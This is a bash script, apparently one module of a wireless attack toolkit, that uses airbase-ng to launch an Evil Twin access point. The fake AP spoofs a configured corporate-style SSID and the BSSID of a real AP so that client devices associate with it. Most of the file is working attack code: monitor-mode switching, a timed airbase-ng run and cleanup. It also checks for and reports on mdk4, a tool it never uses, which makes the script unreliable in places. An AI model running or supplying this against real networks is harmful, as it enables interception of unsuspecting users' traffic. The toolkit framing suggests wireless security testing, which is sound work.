#!/bin/bash
#
# Utility: Directed Probe Response using airbase-ng
#
# Description:
#   Launches a spoofed access point using airbase-ng that responds to probe requests
#   for a configured SSID. This simulates an Evil Twin-style setup to trick clients
#   into associating with a fake AP.
#
# Requirements:
#   - airbase-ng must be installed and in PATH
#   - Must be run with sudo/root privileges (handled by watt.py)
#   - Interface must support monitor mode
#
# Usage:
#   ./run_airbase_probe.sh
#
# Inputs:
#   - Duration in seconds (prompted at runtime)
#
# Config:
#   - SSID and channel are defined in config.sh:
#       T016_PROBE_SSID="WSTTCorpWiFi"
#       T016_PROBE_BSSID="02:00:00:00:00:04" # match real AP
#       T016_PROBE_CHANNEL=6
#
# Notes:
#   - Automatically enables monitor mode if needed
#   - Cleans up on SIGINT or timeout using EXIT trap
#   - Clients previously connected to the spoofed SSID may auto-associate

# Load helpers
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$SCRIPT_DIR/config.sh"
source "$SCRIPT_DIR/print.sh"

# Check mdk4
if ! command -v mdk4 &> /dev/null; then
    print_fail "mdk4 not found. Please install it first."
    exit 0
fi

# Cleanup
cleanup() {
    print_blank
    print_info "Starting cleanup"
    rm -f /tmp/watt_attack_active

    # Check mode
    MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
    if [[ "$MODE" != "managed" ]]; then
        print_action "Reverting to Managed mode"
        bash "$SCRIPT_DIR/set-mode-managed.sh"
        print_success "Interface set to Managed mode"
    fi

    exit 0   
}

# Exit traps
trap cleanup EXIT
trap cleanup SIGINT

# Validate config vars
if [[ -z "$INTERFACE" || -z "$T016_PROBE_SSID" || -z "$T016_PROBE_CHANNEL" ]]; then
    print_warn "Required variables not defined in config.sh: INTERFACE, T016_PROBE_SSID, or T016_PROBE_CHANNEL"
    exit 0
fi

# Display config
echo "Mode         : T016 - Directed Probe Response"
echo "Interface    : $INTERFACE"
echo "Target SSID  : $T016_PROBE_SSID"
echo "Target BSSID : $T016_PROBE_BSSID"
echo "Channel      : $T016_PROBE_CHANNEL"
print_blank

# Confirm attack
print_prompt "Proceed with attack? (y/N): "
read -r confirm

if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    print_warn "Cancelled"
    exit 0
fi

# Input duration
while true; do
    print_prompt "Duration (seconds) [default: ${ATTACK_DURATION}]: "
    read -r DURATION

    DURATION="${DURATION:-$ATTACK_DURATION}"
    
    if [[ "$DURATION" =~ ^[0-9]+$ ]]; then
        break
    else
        print_fail "Invalid input. Enter a numeric value"
    fi
done

# Launch attack
echo "T016" > /tmp/watt_attack_active
print_blank
print_info "Starting Attack"

# Check mode
MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
if [[ "$MODE" != "monitor" ]]; then
    print_action "Enabling Monitor mode"
    bash "$SCRIPT_DIR/set-mode-monitor.sh"
    print_success "Interface set to Monitor mode"
fi

# Run attack
print_blank
print_info "Running T016 - Directed Probe Response for $DURATION seconds"
sudo timeout "$DURATION" airbase-ng -e "$T016_PROBE_SSID" -c "$T016_PROBE_CHANNEL" -a "$T016_PROBE_BSSID" "$INTERFACE"

EXIT_CODE=$?

# Exit check
if [[ "$EXIT_CODE" -eq 124 ]]; then
    print_success "Attack ended"
elif [[ "$EXIT_CODE" -ne 0 ]]; then
    print_fail "mdk4 exited with code $EXIT_CODE"
fi

exit 0